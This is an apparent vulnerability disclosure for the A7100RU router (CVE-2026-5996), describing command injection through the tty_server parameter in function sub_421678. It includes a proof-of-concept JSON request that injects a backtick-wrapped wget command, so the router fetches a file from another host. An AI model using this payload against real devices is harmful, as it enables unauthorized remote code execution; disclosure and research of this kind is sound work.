# A7100RU Vulnerability（CVE-2026-5996）
...
In  sub_421678 function, it reads in a user-provided parameter `tty_server` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `tty_server` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setAdvancedInfoShow","tty_server":"`wget 192.168.6.1:7777/testpoc`"
